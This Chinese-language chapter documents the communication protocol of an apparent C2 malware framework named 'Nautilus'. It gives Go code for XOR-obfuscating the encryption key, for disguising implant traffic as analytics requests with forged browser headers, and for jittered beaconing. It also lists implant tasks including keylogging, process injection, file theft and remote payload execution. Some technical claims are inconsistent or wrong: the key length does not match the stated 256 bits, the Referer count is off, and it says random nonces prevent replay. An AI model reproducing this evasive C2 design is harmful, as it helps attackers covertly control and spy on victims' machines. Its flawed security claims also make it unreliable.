## 概述

C2 通信需要同时满足两个条件：

1. **外观上**：看起来是一次正常的前端埋点数据上报，没有自定义 Header、异常路径或参数
2. **内容上**：即使被截获，也无法解密或识别荷载内容

本章解析 Nautilus 的通信协议栈：AES-GCM 加密实现、HTTP 流量伪装、心跳与任务轮询机制、WebSocket 实时推送。

---

## 一、协议栈总览

```
┌──────────────────────────────────────────────────┐
│                TaskReq / TaskResp                 │  ← 业务层
│            (JSON 序列化，TaskType + Params)        │
├──────────────────────────────────────────────────┤
│              AES-GCM 加密 + 认证                   │  ← 加密层
│            (256-bit key, 12-byte nonce)           │
├──────────────────────────────────────────────────┤
│              Base64 URL-safe 编码                 │  ← 编码层
│              (无 padding 字符)                     │
├──────────────────────────────────────────────────┤
│         HTTP GET /api/v1/analytics                │  ← 传输层
│       ?id=<base64>&sid=<session_id>              │
│    Headers: 完整浏览器伪装 (Chrome UA + Referer)    │
└──────────────────────────────────────────────────┘
```

数据流向：`TaskReq → JSON → AES-GCM加密 → Base64编码 → HTTP GET 参数 → 发送`

## 二、AES-GCM 加密层

### 2.1 为什么选 AES-GCM

| 对比项 | AES-GCM | AES-CTR | ChaCha20-Poly1305 |
|--------|---------|---------|-------------------|
| 加密+认证 | 一体化 | 需要额外 HMAC | 一体化 |
| 性能 | 极高（x86 AES-NI 加速） | 高 | 高 |
| 标准性 | NIST 标准 | NIST 标准 | RFC 7539 |
| 流量特征 | 常见于 TLS 1.2+ | 较少见 | 较少见 |

AES-GCM 是 TLS 1.2+ 的标准加密套件之一，在 Web 流量中普遍存在。选择 AES-GCM 意味着加密后的数据在统计特性上与正常 HTTPS 流量无异。

### 2.2 密钥混淆

密钥不在二进制中明文存储——编译期 XOR 混淆，运行时动态还原：

```go
// 编译期存储的混淆密钥
var ObfKey = []byte{0x1a, 0x2b, 0x3c, 0x4d, 0x5e, 0x6f, 0x70, 0x81,
    0x92, 0xa3, 0xb4, 0xc5, 0xd6, 0xe7, 0xf8, 0x09}

// 运行时还原：XOR 0x55 得到真实密钥
func GetKey() []byte {
    out := make([]byte, len(ObfKey))
    for i, b := range ObfKey {
        out[i] = b ^ 0x55  // 0x1a^0x55 = 0x4F, 0x2b^0x55 = 0x7E, ...
    }
    return out
}
```

### 2.3 加密流程

```go
func AesEncrypt(plaintext []byte) ([]byte, error) {
    key := GetKey()                          // 还原密钥
    block, _ := aes.NewCipher(key)           // 创建 AES cipher
    gcm, _ := cipher.NewGCM(block)           // 包装为 GCM 模式

    nonce := make([]byte, gcm.NonceSize())   // 12 bytes
    rand.Read(nonce)                          // 随机 nonce

    // ciphertext = nonce || GCM-Seal(plaintext)
    return append(nonce, gcm.Seal(nil, nonce, plaintext, nil)...), nil
}
```

**关键设计**：
- 每次加密使用随机 nonce，同一明文两次加密结果完全不同
- nonce 前面追加到密文，接收方先提取前 12 字节作为 nonce 再解密
- GCM 自带认证标签（16 bytes），篡改密文会导致解密失败

### 2.4 解密流程

```go
func AesDecrypt(ciphertext []byte) ([]byte, error) {
    key := GetKey()
    block, _ := aes.NewCipher(key)
    gcm, _ := cipher.NewGCM(block)

    nonceSize := gcm.NonceSize()
    nonce := ciphertext[:nonceSize]       // 提取前12字节为nonce
    ct := ciphertext[nonceSize:]          // 剩余为密文+认证标签

    return gcm.Open(nil, nonce, ct, nil)  // 解密+认证
}
```

## 三、HTTP 传输层伪装

### 3.1 路径设计

```
GET /api/v1/analytics?id=<AES-GCM+Base64>&sid=<session_id>
```

| 组成部分 | 伪装理由 |
|----------|---------|
| 路径 `/api/v1/analytics` | 模拟前端数据采集 API，如 Google Analytics、百度统计 |
| 参数名 `id` | 常见的数据上报参数名，如 `id=page_view_12345` |
| 参数名 `sid` | 模拟 Session ID，符合统计场景 |
| GET 方法 | 前端埋点通常使用 GET（或 POST），GET 更常见于图片/像素埋点 |

### 3.2 请求头伪装

```go
func DefaultConfig(addr string) *HTTPConfig {
    return &HTTPConfig{
        C2Addr:    addr,
        Path:      "/api/v1/analytics",
        UserAgent: randomUA(),  // 7种 UA 随机切换
        Headers: map[string]string{
            "Accept":             "application/json, text/plain, */*",
            "Accept-Language":    "zh-CN,zh;q=0.9,en;q=0.8",
            "Accept-Encoding":    "gzip, deflate, br",
            "Cache-Control":      "no-cache",
            "Origin":             "http://localhost:8080",
            "Referer":            randomReferer(),
            "Sec-Ch-Ua":          `"Google Chrome";v="125"`,
            "Sec-Ch-Ua-Mobile":   "?0",
            "Sec-Ch-Ua-Platform": `"Windows"`,
            "Sec-Fetch-Dest":     "empty",
            "Sec-Fetch-Mode":     "cors",
            "Sec-Fetch-Site":     "same-origin",
            "X-Requested-With":   "XMLHttpRequest",
        },
    }
}
```

**关键伪装点**：

- **7 种 User-Agent 轮换**：Chrome 125/124/123、Firefox 126、Edge 125、Opera 111、Chrome WOW64，模拟多浏览器环境
- **8 种 Referer 随机**：google.com、bing.com、yahoo.com、baidu.com、douban.com、csdn.net、github.com
- **Sec-* 系列头**：Chrome 浏览器特有的安全头，由真实浏览器自动添加
- **X-Requested-With**：标记为 AJAX 请求，符合前端 API 调用特征

### 3.3 心跳抖动

固定间隔的 C2 通信是流量审计的经典特征。Nautilus 使用带随机抖动的心跳：

```go
func (t *HTTPTransport) GetInterval() time.Duration {
    base := t.config.Interval   // 基础间隔（秒）
    jitter := t.config.Jitter   // 抖动百分比（如 30）
    variance := base * jitter / 100
    delay := base + (int(time.Now().UnixNano()) % (2*variance + 1)) - variance
    return time.Duration(delay) * time.Second
}
```

例如 `Interval=5, Jitter=30`，实际间隔在 `3.5s ~ 6.5s` 之间随机波动，避免产生规律性的网络行为模式。

## 四、协议编码层

### 4.1 任务类型设计

```go
type TaskType uint16

const (
    TaskSysInfo     TaskType = 0x0103  // 系统信息
    TaskProclist    TaskType = 0x0104  // 进程列表
    TaskExecCmd     TaskType = 0x0101  // CMD 执行
    TaskExecPS      TaskType = 0x0102  // PowerShell 执行
    TaskListDir     TaskType = 0x0201  // 目录浏览
    TaskFileRead    TaskType = 0x0202  // 文件读取
    TaskFileWrite   TaskType = 0x0203  // 文件写入
    TaskFileDelete  TaskType = 0x0204  // 文件删除
    TaskKill        TaskType = 0x0301  // 终止进程
    TaskPrivInfo    TaskType = 0x0401  // 权限信息
    TaskPayload     TaskType = 0x0501  // 远程载荷执行
    TaskInject      TaskType = 0x0502  // 进程注入
    TaskScreenshot  TaskType = 0x0601  // 截屏
    TaskKeylogOn    TaskType = 0x0602  // 启动键盘记录
    TaskKeylogOff   TaskType = 0x0603  // 停止键盘记录
    TaskExit        TaskType = 0x0F01  // 退出
)
```

任务类型编码为 `uint16`，按功能模块分组：`0x01xx` 命令执行、`0x02xx` 文件操作、`0x03xx` 进程操作、`0x05xx` 注入、`0x06xx` 信息收集。这种分组不是安全机制，而是为了代码可维护性。

### 4.2 消息类型

```go
type MsgType uint16

const (
    MsgHeartbeat  MsgType = 0x0001  // 心跳包
    MsgRegister   MsgType = 0x0002  // 注册（首次上线）
    MsgTaskReq    MsgType = 0x0003  // 任务请求（植入体轮询）
    MsgTaskResp   MsgType = 0x0004  // 任务响应（服务端下发）
    MsgResult     MsgType = 0x0005  // 结果回传
)
```

### 4.3 数据包结构

```
┌──────────┬──────────┬──────────┬──────────┬──────────┐
│  Type    │  Length  │  Seq     │  TaskID  │  Data    │
│  2 bytes │  4 bytes │  4 bytes │  4 bytes │  variable│
└──────────┴──────────┴──────────┴──────────┴──────────┘
```

- **Type**：消息类型（MsgHeartbeat/MsgTaskReq/MsgResult）
- **Length**：Data 字段长度
- **Seq**：包序列号，用于去重和排序
- **TaskID**：任务 ID，请求-响应关联
- **Data**：JSON 序列化的业务数据

## 五、服务端 WebSocket 实时推送

### 5.1 为什么需要 WebSocket

C2 服务端需要实时向 Web UI 推送状态更新（新会话上线、任务完成、结果回传）。如果使用轮询，会增加不必要的网络流量和延迟。WebSocket 提供全双工实时通信，效率最高。

### 5.2 实现架构

```
植入体 ← HTTP Polling → C2 Server ← WebSocket → Web UI 浏览器
                                        ↕
                                    控制台 CLI
```

服务端维护一个 WebSocket 连接池，所有活跃的浏览器客户端都会收到实时推送：

```go
type Hub struct {
    clients    map[*Client]bool
    broadcast  chan []byte
    register   chan *Client
    unregister chan *Client
}

// 任务结果到达时，推送给所有 Web UI 客户端
func (h *Hub) PushResult(result *TaskResult) {
    data, _ := json.Marshal(result)
    h.broadcast <- data
}
```

## 六、完整通信流程

### 6.1 植入体注册

```
植入体 → C2 Server:
  POST /api/v1/analytics?id=<AES-GCM(MsgRegister+hostname+os+arch)>&sid=
  Headers: 浏览器伪装

C2 Server → 植入体:
  HTTP 200 OK
  Body: <Base64(AES-GCM(session_id))>
```

### 6.2 心跳轮询

```
植入体 → C2 Server:  ← 每 5±1.5 秒
  GET /api/v1/analytics?id=<AES-GCM(MsgHeartbeat)>&sid=<session_id>

C2 Server → 植入体:
  HTTP 200 OK
  Body: <Base64(AES-GCM(TaskReq or empty))>
```

### 6.3 任务执行与结果回传

```
植入体 → C2 Server:
  GET /api/v1/analytics?id=<AES-GCM(MsgResult+task_id+output)>&sid=<session_id>

C2 Server → Web UI (WebSocket):
  {"type": "task_result", "task_id": 5, "success": true, "output": "..."}
```

## 七、安全考量

| 层面 | 措施 |
|------|------|
| 密钥保护 | 编译期 XOR 混淆，`strings` 扫描不到原始密钥 |
| 数据完整性 | AES-GCM 自带认证标签，篡改即解密失败 |
| 重放攻击 | 每次加密使用随机 nonce，相同明文不同密文 |
| 流量特征 | HTTP 完整浏览器伪装，无自定义 Header |
| 心跳模式 | 30% 随机抖动，无规律性行为 |
| 编码方式 | Base64 URL-safe 无 padding，无特殊字符 |
